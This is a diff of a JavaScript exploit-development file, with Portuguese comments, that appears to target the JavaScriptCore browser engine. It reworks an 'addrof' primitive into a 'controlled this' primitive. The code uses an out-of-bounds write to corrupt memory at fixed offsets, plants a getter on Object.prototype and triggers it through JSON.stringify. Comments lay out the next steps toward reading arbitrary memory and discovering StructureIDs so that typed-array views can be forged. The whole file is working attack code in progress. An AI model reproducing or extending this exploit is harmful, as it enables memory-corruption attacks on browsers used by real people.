@@ -14,199 +14,156 @@ import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v9";
+const FNAME_MAIN = "ExploitLogic_v9.1"; // Atualizado para v9.1
 
-// --- Configurações para Addrof ---
-const GETTER_PROPERTY_NAME_ADDROF = "AAAA_GetterForAddrof_v9";
-const ADDROF_PLANT_OFFSET_0x6C = 0x6C; // Onde plantamos o valor que pode ser vazado
-const ADDROF_CORRUPTION_OFFSET_TRIGGER = 0x70; // Onde escrevemos para acionar a "mágica"
-const ADDROF_CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
+// --- Configurações para "Controlled This" ---
+const GETTER_PROPERTY_NAME_CONTROLLED_THIS = "AAAA_GetterForControlledThis_v91"; // Nome atualizado
+const CONTROLLED_THIS_PLANT_OFFSET_0x6C = 0x6C;
+const CONTROLLED_THIS_CORRUPTION_OFFSET_TRIGGER = 0x70;
+const CONTROLLED_THIS_CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-// --- Globais para Addrof ---
-let addrof_victim_object = null;
-let addrof_getter_called_flag = false;
-let addrof_leaked_value = null;
+// --- Globais para "Controlled This" ---
+let controlled_this_getter_called_flag = false;
+let controlled_this_leaked_value = null; // O valor que 'this' se torna
+let current_victim_obj_for_stringify = null; // O objeto usado no JSON.stringify
 
 // --- Globais para StructureID Discovery ---
 let discovered_uint32array_structure_id = null;
-let discovered_arraybuffer_structure_id = null;
-
-// --- Configurações para Corrupção de View (Pós-Addrof e Descoberta de SID) ---
-const VIEW_CORRUPTION_TARGET_OFFSET_IN_OOB = 0x58; // Onde tentaremos corromper metadados da view
-const VIEW_CORRUPTION_MVECTOR_LOW = 0x00000000;
-const VIEW_CORRUPTION_MVECTOR_HIGH = 0x00000000;
-const VIEW_CORRUPTION_MLENGTH = 0xFFFFFFFF;
-
+// let discovered_arraybuffer_structure_id = null; // Ainda não estamos focando neste
 
 // ============================================================
-// PRIMITIVA ADDROF (Baseada em addrofValidationAttempt_v18a)
+// PRIMITIVA "CONTROLLED THIS"
 // ============================================================
 
-function setupAddrofGetter(expected_leak_value) {
-    const FNAME_SETUP_GETTER = `${FNAME_MAIN}.setupAddrofGetter`;
-    addrof_getter_called_flag = false;
-    addrof_leaked_value = null;
+function setupControlledThisGetter(expected_this_value) {
+    const FNAME_SETUP_GETTER = `${FNAME_MAIN}.setupControlledThisGetter`;
+    controlled_this_getter_called_flag = false;
+    controlled_this_leaked_value = null;
 
-    Object.defineProperty(Object.prototype, GETTER_PROPERTY_NAME_ADDROF, {
+    Object.defineProperty(Object.prototype, GETTER_PROPERTY_NAME_CONTROLLED_THIS, {
         configurable: true,
         get: function () {
-            addrof_getter_called_flag = true;
-            logS3(`[GETTER ${GETTER_PROPERTY_NAME_ADDROF}]: ACIONADO! 'this' é: ${this}`, "good", FNAME_SETUP_GETTER);
+            controlled_this_getter_called_flag = true;
+            // No seu log addrofValidationAttempt_v18a, 'this' aqui é inicialmente o objeto
+            // usado no stringify, e *depois* parece ser corrompido para o valor de 0x6C.
+            logS3(`[GETTER ${GETTER_PROPERTY_NAME_CONTROLLED_THIS}]: ACIONADO! 'this' inicial: ${this}`, "good", FNAME_SETUP_GETTER);
 
-            // A "mágica" do seu 'addrofValidationAttempt_v18a' sugere que 'this' pode se tornar
-            // o valor que plantamos em 0x6C.
-            // No seu log, 'this' pareceu vazar como o valor plantado.
-            addrof_leaked_value = this; // 'this' aqui pode ser o valor vazado.
+            // A hipótese é que, após a "mágica" da corrupção, 'this' se torna o valor plantado.
+            // Em 'addrofValidationAttempt_v18a', você logou 'this' *após* a mágica.
+            // Aqui, vamos capturar 'this' como está quando o getter é chamado.
+            // O teste real é se este 'this' é igual a 'expected_this_value'
+            // (o valor que plantamos em 0x6C).
+            controlled_this_leaked_value = this;
 
-            logS3(`[GETTER ${GETTER_PROPERTY_NAME_ADDROF}]: 'this' (potencial valor vazado) é: ${isAdvancedInt64Object(this) ? this.toString(true) : String(this)}`, "leak", FNAME_SETUP_GETTER);
+            logS3(`[GETTER ${GETTER_PROPERTY_NAME_CONTROLLED_THIS}]: 'this' (potencial valor controlado) é: ${isAdvancedInt64Object(this) ? this.toString(true) : String(this)}`, "leak", FNAME_SETUP_GETTER);
 
-            // Se 'this' for realmente o ponteiro vazado como um AdvancedInt64 (ou número se couber)
-            if (isAdvancedInt64Object(expected_leak_value) && isAdvancedInt64Object(this) && this.equals(expected_leak_value)) {
-                 logS3(`[GETTER ${GETTER_PROPERTY_NAME_ADDROF}]: CONFIRMADO! 'this' é igual ao valor plantado ${expected_leak_value.toString(true)}`, "vuln", FNAME_SETUP_GETTER);
-            } else if (this === expected_leak_value) {
-                 logS3(`[GETTER ${GETTER_PROPERTY_NAME_ADDROF}]: CONFIRMADO! 'this' é igual ao valor plantado ${toHex(expected_leak_value)}`, "vuln", FNAME_SETUP_GETTER);
+            if (isAdvancedInt64Object(expected_this_value) && isAdvancedInt64Object(this) && this.equals(expected_this_value)) {
+                 logS3(`[GETTER ${GETTER_PROPERTY_NAME_CONTROLLED_THIS}]: CONFIRMADO! 'this' é igual ao valor plantado ${expected_this_value.toString(true)}`, "vuln", FNAME_SETUP_GETTER);
+            } else if (this === expected_this_value) { // Para números simples se não for AdvInt64
+                 logS3(`[GETTER ${GETTER_PROPERTY_NAME_CONTROLLED_THIS}]: CONFIRMADO! 'this' é igual ao valor plantado ${toHex(expected_this_value)}`, "vuln", FNAME_SETUP_GETTER);
+            } else {
+                 logS3(`[GETTER ${GETTER_PROPERTY_NAME_CONTROLLED_THIS}]: AVISO! 'this' (${isAdvancedInt64Object(this) ? this.toString(true) : String(this)}) NÃO é igual ao valor plantado esperado (${isAdvancedInt64Object(expected_this_value) ? expected_this_value.toString(true) : toHex(expected_this_value)}) diretamente na entrada do getter. A "mágica" pode ocorrer depois.`, "warn", FNAME_SETUP_GETTER);
             }
-
-
-            // Tentativa de ler o JSCell Header do 'this' (se 'this' for um ponteiro válido)
-            // Esta parte é arriscada se 'this' não for um ponteiro para o oob_array_buffer_real
-            // Mas como estamos usando 'oob_write_absolute' para plantar, o ponteiro "vazado"
-            // seria um valor numérico que plantamos, não um endereço real que podemos ler diretamente.
-            // A validação de que 'this' se torna o 'expected_leak_value' é o principal.
-
-            return "valor_do_getter_addrof";
+            return "valor_do_getter_controlled_this";
         }
     });
-    logS3(`Getter '${GETTER_PROPERTY_NAME_ADDROF}' configurado em Object.prototype.`, "info", FNAME_SETUP_GETTER);
+    logS3(`Getter '${GETTER_PROPERTY_NAME_CONTROLLED_THIS}' configurado em Object.prototype.`, "info", FNAME_SETUP_GETTER);
 }
 
-function cleanupAddrofGetter() {
-    delete Object.prototype[GETTER_PROPERTY_NAME_ADDROF];
-    // logS3(`Getter '${GETTER_PROPERTY_NAME_ADDROF}' removido de Object.prototype.`, "info", `${FNAME_MAIN}.cleanupAddrofGetter`);
+function cleanupControlledThisGetter() {
+    delete Object.prototype[GETTER_PROPERTY_NAME_CONTROLLED_THIS];
 }
 
-async function attemptAddrof(object_to_find_addr, planted_value_for_leak) {
-    const FNAME_ATTEMPT_ADDROF = `${FNAME_MAIN}.attemptAddrof`;
-    logS3(`--- Tentando obter addrof para um objeto usando o valor plantado: ${isAdvancedInt64Object(planted_value_for_leak) ? planted_value_for_leak.toString(true) : toHex(planted_value_for_leak)} ---`, "test", FNAME_ATTEMPT_ADDROF);
+async function attemptControlledThis(value_to_plant_at_0x6C) {
+    const FNAME_ATTEMPT = `${FNAME_MAIN}.attemptControlledThis`;
+    logS3(`--- Tentando controlar 'this' no getter. Plantando em 0x6C: ${isAdvancedInt64Object(value_to_plant_at_0x6C) ? value_to_plant_at_0x6C.toString(true) : toHex(value_to_plant_at_0x6C)} ---`, "test", FNAME_ATTEMPT);
 
     if (!oob_array_buffer_real) {
         await triggerOOB_primitive();
     }
 
-    addrof_victim_object = object_to_find_addr; // O objeto que queremos que seja 'this' no getter
-
-    // 1. Plantar o valor em 0x6C que esperamos que seja "vazado" como 'this'
-    logS3(`Plantando valor ${isAdvancedInt64Object(planted_value_for_leak) ? planted_value_for_leak.toString(true) : toHex(planted_value_for_leak)} em ${toHex(ADDROF_PLANT_OFFSET_0x6C)}`, "info", FNAME_ATTEMPT_ADDROF);
-    if (isAdvancedInt64Object(planted_value_for_leak)) {
-        oob_write_absolute(ADDROF_PLANT_OFFSET_0x6C, planted_value_for_leak, 8);
-    } else { // Assume número de 32 bits se não for AdvInt64
-        oob_write_absolute(ADDROF_PLANT_OFFSET_0x6C, planted_value_for_leak, 4);
-        oob_write_absolute(ADDROF_PLANT_OFFSET_0x6C + 4, 0, 4); // Zera a parte alta
+    // 1. Plantar o valor em 0x6C
+    logS3(`Plantando valor em ${toHex(CONTROLLED_THIS_PLANT_OFFSET_0x6C)}`, "info", FNAME_ATTEMPT);
+    if (isAdvancedInt64Object(value_to_plant_at_0x6C)) {
+        oob_write_absolute(CONTROLLED_THIS_PLANT_OFFSET_0x6C, value_to_plant_at_0x6C, 8);
+    } else {
+        oob_write_absolute(CONTROLLED_THIS_PLANT_OFFSET_0x6C, value_to_plant_at_0x6C, 4);
+        oob_write_absolute(CONTROLLED_THIS_PLANT_OFFSET_0x6C + 4, 0, 4); // Zera parte alta
     }
+    const val_read_back_from_0x6C = oob_read_absolute(CONTROLLED_THIS_PLANT_OFFSET_0x6C, isAdvancedInt64Object(value_to_plant_at_0x6C) ? 8:4);
+    logS3(`   Valor lido de volta de ${toHex(CONTROLLED_THIS_PLANT_OFFSET_0x6C)}: ${isAdvancedInt64Object(val_read_back_from_0x6C) ? val_read_back_from_0x6C.toString(true) : toHex(val_read_back_from_0x6C)}`, "info", FNAME_ATTEMPT);
+
 
     // 2. Configurar o getter
-    setupAddrofGetter(planted_value_for_leak);
+    setupControlledThisGetter(value_to_plant_at_0x6C);
 
-    // 3. Acionar a corrupção/lógica que faz 'this' no getter ser o valor plantado
-    //    No seu log, parece que a escrita em 0x70 é o trigger.
-    logS3(`Acionando corrupção em ${toHex(ADDROF_CORRUPTION_OFFSET_TRIGGER)} com ${ADDROF_CORRUPTION_VALUE_TRIGGER.toString(true)}`, "info", FNAME_ATTEMPT_ADDROF);
-    oob_write_absolute(ADDROF_CORRUPTION_OFFSET_TRIGGER, ADDROF_CORRUPTION_VALUE_TRIGGER, 8);
+    // 3. Acionar a corrupção principal em 0x70
+    logS3(`Acionando corrupção em ${toHex(CONTROLLED_THIS_CORRUPTION_OFFSET_TRIGGER)} com ${CONTROLLED_THIS_CORRUPTION_VALUE_TRIGGER.toString(true)}`, "info", FNAME_ATTEMPT);
+    oob_write_absolute(CONTROLLED_THIS_CORRUPTION_OFFSET_TRIGGER, CONTROLLED_THIS_CORRUPTION_VALUE_TRIGGER, 8);
 
-    // 4. Acionar o getter usando JSON.stringify no objeto vítima
-    //    Isso é crucial. O JSON.stringify precisa iterar sobre as propriedades
-    //    do addrof_victim_object e encontrar GETTER_PROPERTY_NAME_ADDROF.
+    // 4. Acionar o getter usando JSON.stringify em um objeto SIMPLES
+    current_victim_obj_for_stringify = { dummy_prop: "activate_getter" }; // Objeto simples
     let stringified_victim;
     try {
-        logS3(`Tentando acionar getter via JSON.stringify(addrof_victim_object)...`, "info", FNAME_ATTEMPT_ADDROF);
-        stringified_victim = JSON.stringify(addrof_victim_object);
+        logS3(`Tentando acionar getter via JSON.stringify em um objeto simples...`, "info", FNAME_ATTEMPT);
+        stringified_victim = JSON.stringify(current_victim_obj_for_stringify);
     } catch (e) {
-        logS3(`Erro durante JSON.stringify para acionar getter addrof: ${e.message}`, "warn", FNAME_ATTEMPT_ADDROF);
+        logS3(`Erro durante JSON.stringify para acionar getter: ${e.message}`, "warn", FNAME_ATTEMPT);
     } finally {
-        cleanupAddrofGetter();
+        cleanupControlledThisGetter();
     }
 
-    logS3(`JSON.stringify do objeto vítima resultou em: ${stringified_victim}`, "info", FNAME_ATTEMPT_ADDROF);
-    logS3(`Flag do getter: ${addrof_getter_called_flag}`, "info", FNAME_ATTEMPT_ADDROF);
-    logS3(`Valor vazado ('this' no getter): ${isAdvancedInt64Object(addrof_leaked_value) ? addrof_leaked_value.toString(true) : String(addrof_leaked_value)}`, "leak", FNAME_ATTEMPT_ADDROF);
+    logS3(`JSON.stringify do objeto simples resultou em: ${stringified_victim}`, "info", FNAME_ATTEMPT);
+    logS3(`Flag do getter '${GETTER_PROPERTY_NAME_CONTROLLED_THIS}': ${controlled_this_getter_called_flag}`, "info", FNAME_ATTEMPT);
+    logS3(`Valor de 'this' capturado no getter: ${isAdvancedInt64Object(controlled_this_leaked_value) ? controlled_this_leaked_value.toString(true) : String(controlled_this_leaked_value)}`, "leak", FNAME_ATTEMPT);
 
-    if (addrof_getter_called_flag &&
-        ((isAdvancedInt64Object(planted_value_for_leak) && isAdvancedInt64Object(addrof_leaked_value) && addrof_leaked_value.equals(planted_value_for_leak)) ||
-         (addrof_leaked_value === planted_value_for_leak))) {
-        logS3(`!!!! SUCESSO ADDR_OF !!!! O valor plantado ${isAdvancedInt64Object(planted_value_for_leak) ? planted_value_for_leak.toString(true) : toHex(planted_value_for_leak)} foi vazado como 'this' no getter.`, "vuln", FNAME_ATTEMPT_ADDROF);
-        document.title = `ADDROF OK: ${isAdvancedInt64Object(planted_value_for_leak) ? planted_value_for_leak.toString(true) : toHex(planted_value_for_leak)}`;
-        return planted_value_for_leak; // Este é o "endereço" (na verdade, o valor que plantamos)
+    if (controlled_this_getter_called_flag &&
+        ((isAdvancedInt64Object(value_to_plant_at_0x6C) && isAdvancedInt64Object(controlled_this_leaked_value) && controlled_this_leaked_value.equals(value_to_plant_at_0x6C)) ||
+         (controlled_this_leaked_value === value_to_plant_at_0x6C))) {
+        logS3(`!!!! SUCESSO "CONTROLLED THIS" !!!! O valor plantado ${isAdvancedInt64Object(value_to_plant_at_0x6C) ? value_to_plant_at_0x6C.toString(true) : toHex(value_to_plant_at_0x6C)} foi retornado como 'this' no getter.`, "vuln", FNAME_ATTEMPT);
+        document.title = `ControlledThis OK: ${isAdvancedInt64Object(value_to_plant_at_0x6C) ? value_to_plant_at_0x6C.toString(true).substring(0,20) : toHex(value_to_plant_at_0x6C)}`;
+        return controlled_this_leaked_value; // Retorna o valor que 'this' se tornou
     } else {
-        logS3("Falha na tentativa de addrof. O valor plantado não foi retornado como 'this' no getter ou o getter não foi chamado.", "error", FNAME_ATTEMPT_ADDROF);
+        logS3("Falha na tentativa de 'Controlled This'. O valor plantado não foi 'this' no getter ou o getter não foi chamado.", "error", FNAME_ATTEMPT);
+        if (!controlled_this_getter_called_flag) document.title = "ControlledThis: Getter NÃO CHAMADO";
+        else document.title = "ControlledThis: 'this' NÃO IGUAL";
         return null;
     }
 }
 
 // ============================================================
-// DESCOBERTA DE STRUCTURE ID (Usando a primitiva addrof)
+// DESCOBERTA DE STRUCTURE ID (Ainda não funcional para SID real)
 // ============================================================
 async function discoverStructureIDs() {
     const FNAME_DISCOVER_SID = `${FNAME_MAIN}.discoverStructureIDs`;
-    logS3(`--- Iniciando Descoberta de Structure IDs ---`, "test", FNAME_DISCOVER_SID);
+    logS3(`--- Iniciando Teste da Primitiva "Controlled This" (anteriormente Descoberta de SID) ---`, "test", FNAME_DISCOVER_SID);
 
     if (!oob_array_buffer_real) await triggerOOB_primitive();
 
-    // 1. Criar um objeto Uint32Array de amostra
-    let sample_u32_array = new Uint32Array(8);
-    sample_u32_array[0] = 0x11223344;
+    const marker_value_for_this = new AdvancedInt64(0xABABABAB, 0xCDCDCDCD); // Marcador único
 
-    // 2. Criar um objeto ArrayBuffer de amostra
-    let sample_array_buffer = new ArrayBuffer(16);
-    let temp_dv = new DataView(sample_array_buffer);
-    temp_dv.setUint32(0, 0xAABBCCDD, true);
+    logS3("Testando a primitiva 'Controlled This'...", "info", FNAME_DISCOVER_SID);
+    let controlled_this_result = await attemptControlledThis(marker_value_for_this);
 
-
-    // 3. Tentar obter o "endereço" (valor plantado que representa o endereço) do Uint32Array
-    //    Para a primitiva addrof funcionar como no seu log, precisamos que o objeto
-    //    tenha a propriedade GETTER_PROPERTY_NAME_ADDROF (via Object.prototype).
-    //    O `object_to_find_addr` é `addrof_victim_object` que é usado no stringify.
-    //    O valor que plantamos (e esperamos vazar) precisa ser único para cada objeto
-    //    para que possamos associar o "endereço" vazado ao objeto correto.
-
-    const u32_addr_marker = new AdvancedInt64(0x12340000, 0x56780000); // Marcador único para U32Array
-    const ab_addr_marker = new AdvancedInt64(0xABCD0000, 0xEFAB0000);  // Marcador único para ArrayBuffer
-
-    logS3("Tentando addrof para Uint32Array...", "info", FNAME_DISCOVER_SID);
-    let u32_fake_addr = await attemptAddrof(sample_u32_array, u32_addr_marker);
-
-    if (u32_fake_addr && u32_fake_addr.equals(u32_addr_marker)) {
-        logS3(`Sucesso ao obter 'fake_addr' para Uint32Array: ${u32_fake_addr.toString(true)}`, "good", FNAME_DISCOVER_SID);
-        // Agora, a parte complicada: se a primitiva addrof apenas retorna o VALOR PLANTADO,
-        // ela não nos dá o endereço REAL do objeto na memória para lermos seu StructureID diretamente.
-        // O seu log 'addrofValidationAttempt_v18a' sugere que 'this' no getter se torna o valor plantado.
-        // Ele NÃO copia o JSCell do objeto para o início do oob_buffer.
-        //
-        // "POTENCIAL ADDR_OF OBTIDO: 0x180a180a_00000000"
-        // "QWORD lido do INÍCIO do oob_buffer (suposto JSCell copiado): 0x00000000_00000000"
-        //
-        // Isso significa que o 'this' se tornou 0x180a180a00000000, e o código no getter *tentou* ler de
-        // oob_array_buffer_real + 0x180a180a00000000, o que falhou (ou leu zeros se o ponteiro fosse inválido
-        // e a leitura OOB retornasse zero em vez de travar).
-        //
-        // PRECISAMOS DE UMA FORMA DE VAZAR O CONTEÚDO DO JSCell REAL DO OBJETO.
-        // A atual primitiva 'addrof' apenas confirma que 'this' pode ser controlado.
-        // Para vazar o StructureID, precisamos que o *conteúdo* do objeto (seu JSCell)
-        // seja copiado para uma área conhecida (como o início do oob_array_buffer_real).
-        //
-        // Por enquanto, vamos assumir que PRECISAMOS AINDA DE UM VALOR MANUAL.
-        logS3("AVISO: A primitiva addrof atual vaza o VALOR PLANTADO, não o endereço REAL do objeto.", "warn", FNAME_DISCOVER_SID);
-        logS3("         Para descobrir o StructureID, você ainda precisará encontrá-lo manualmente", "warn", FNAME_DISCOVER_SID);
-        logS3("         ou modificar o getter para COPIAR o JSCell do 'this' (objeto real) para o oob_buffer.", "warn", FNAME_DISCOVER_SID);
-        // Se você souber o StructureID manualmente, defina-o aqui:
-        // discovered_uint32array_structure_id = 0xSUA_CONSTANTE_AQUI;
-        // discovered_arraybuffer_structure_id = 0xSUA_OUTRA_CONSTANTE_AQUI;
-        // logS3(`StructureID para Uint32Array (MANUAL): ${toHex(discovered_uint32array_structure_id)}`, "info", FNAME_DISCOVER_SID);
+    if (controlled_this_result && controlled_this_result.equals(marker_value_for_this)) {
+        logS3(`SUCESSO: Primitiva 'Controlled This' funciona. 'this' no getter se tornou ${marker_value_for_this.toString(true)}.`, "vuln", FNAME_DISCOVER_SID);
+        logS3("   Próximo passo seria modificar o getter para tentar LER dados usando 'this' como um ponteiro (offset) e escrever em oob_buffer.", "info", FNAME_DISCOVER_SID);
     } else {
-        logS3("Falha ao obter 'fake_addr' para Uint32Array.", "error", FNAME_DISCOVER_SID);
+        logS3("Falha ao confirmar a primitiva 'Controlled This'.", "error", FNAME_DISCOVER_SID);
     }
-    await PAUSE_S3(200);
 
-    // Limpando para a próxima tentativa de addrof ou outras operações
-    clearOOBEnvironment();
+    // A lógica para realmente descobrir SID precisaria de uma primitiva addrof(objeto_real) -> endereço_real
+    // ou um getter modificado que usa o 'this' controlado para ler memória.
+    logS3("AVISO: A descoberta REAL de StructureID ainda requer uma primitiva addrof(objeto)->endereço ou um getter modificado.", "warn", FNAME_DISCOVER_SID);
+    // Por enquanto, manteremos o placeholder.
+    if (!discovered_uint32array_structure_id) {
+         // Este valor é o que você forneceu anteriormente como problemático.
+        discovered_uint32array_structure_id = 0xBADBAD00 | 27; // Placeholder
+        logS3(`Usando StructureID placeholder para Uint32Array: ${toHex(discovered_uint32array_structure_id)}`, "warn", FNAME_DISCOVER_SID);
+    }
+
+    await PAUSE_S3(200);
+    clearOOBEnvironment(); // Limpar após o teste da primitiva
 }
 
 
@@ -214,34 +171,21 @@ async function discoverStructureIDs() {
 // FUNÇÃO PRINCIPAL DE EXPLORAÇÃO / TESTE
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.sprayAndInvestigate_v9`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Addrof, Descoberta de SID e Corrupção de View ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.mainTestLogic_v9.1`; // Nome da função principal de teste
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste da Primitiva "Controlled This" ---`, "test", FNAME_CURRENT_TEST);
 
     try {
-        await triggerOOB_primitive();
-        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
+        // Não precisa de triggerOOB_primitive aqui se discoverStructureIDs (ou o que ele chamar) já o faz.
+        // await triggerOOB_primitive();
+        // logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
 
-        // Passo 1: Tentar usar a primitiva addrof e descobrir StructureIDs
-        await discoverStructureIDs();
+        // Passo 1: Testar a primitiva "Controlled This"
+        await discoverStructureIDs(); // Esta função agora testa a primitiva "Controlled This"
 
-        if (discovered_uint32array_structure_id) {
-            logS3(`StructureID para Uint32Array DESCOBERTO/DEFINIDO: ${toHex(discovered_uint32array_structure_id)}`, "good", FNAME_CURRENT_TEST);
-        } else {
-            logS3("AVISO: StructureID para Uint32Array NÃO foi descoberto/definido. A corrupção de View pode não ser verificável.", "warn", FNAME_CURRENT_TEST);
-            logS3("Defina 'EXPECTED_UINT32ARRAY_STRUCTURE_ID' manualmente no código se o conhece.", "warn", FNAME_CURRENT_TEST);
-            // Use um valor placeholder se não descoberto, para permitir que o resto do script rode.
-            // Este valor é o que você forneceu anteriormente como problemático.
-            discovered_uint32array_structure_id = 0xBADBAD00 | 27; // Placeholder
-            logS3(`Usando StructureID placeholder para Uint32Array: ${toHex(discovered_uint32array_structure_id)}`, "warn", FNAME_CURRENT_TEST);
-        }
+        // O restante da lógica de spray e corrupção de view (v8.1) pode ser adicionado aqui depois,
+        // uma vez que tenhamos uma forma de obter o StructureID real.
 
-        // Passo 2: (Opcional por enquanto) Corrupção de View, usando o SID descoberto (ou placeholder)
-        // A lógica de spray de views e corrupção de v8.1 pode ser inserida aqui,
-        // mas agora usando 'discovered_uint32array_structure_id' para verificação.
-        // Por enquanto, vamos focar em estabilizar o addrof.
-
-        logS3("--- Foco atual é na primitiva ADDR_OF e descoberta de Structure ID ---", "info", FNAME_CURRENT_TEST);
-        logS3("--- A lógica de corrupção de View de v8.1 será reintegrada após estabilização do addrof ---", "info", FNAME_CURRENT_TEST);
+        logS3("--- Foco atual é na primitiva 'CONTROLLED THIS' ---", "info", FNAME_CURRENT_TEST);
 
 
     } catch (e) {
@@ -249,8 +193,8 @@ export async function sprayAndInvestigateObjectExposure() {
         if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
         document.title = `${FNAME_MAIN} FALHOU!`;
     } finally {
-        cleanupAddrofGetter(); // Garante limpeza
-        clearOOBEnvironment();
+        cleanupControlledThisGetter(); // Garante limpeza do getter
+        // clearOOBEnvironment(); // discoverStructureIDs já limpa
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
     }
 }
